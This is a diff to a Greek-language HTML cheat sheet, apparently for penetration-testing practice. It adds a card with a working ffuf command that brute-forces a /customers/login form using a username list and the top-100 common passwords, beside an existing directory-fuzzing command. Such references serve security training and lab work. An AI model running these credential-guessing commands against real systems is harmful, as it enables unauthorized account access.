@@ -173,6 +173,14 @@
             <div class="card-desc">Αναζητά συγκεκριμένους τύπους αρχείων (π.χ. .txt, .php, .sh) χρησιμοποιώντας τη wordlist.</div>
             <div class="code-block">ffuf -u http://<span>[TARGET_IP]</span>/FUZZ.php -w /usr/share/wordlists/dirb/common.txt</div>
         </div>
+         <div class="card">
+            <div class="card-header">
+                <div class="card-title">Επίθεση Brute Force με το ffuf για την εύρεση έγκυρων στοιχείων σύνδεσης</div>
+                <span class="category-tag tag-ffuf">Files</span>
+            </div>
+            <div class="card-desc">Αυτή η εντολή δοκιμάζει αυτόματα όλους τους πιθανούς συνδυασμούς χρηστών και κωδικών (Brute Force) στη σελίδα σύνδεσης, χρησιμοποιώντας τα ονόματα από το valid_usernames.txt (W1) και τα 100 δημοφιλέστερα passwords (W2), ενώ κρύβει τις αποτυχημένες προσπάθειες (όσες επιστρέφουν κωδικό HTTP 200) για να σου δείξει μόνο τον σωστό κωδικό.</div>
+            <div class="code-block">ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://[IP TARGET]/customers/login -fc 200</div>
+        </div>
 
         <!-- Content Filtering -->
         <div class="card">
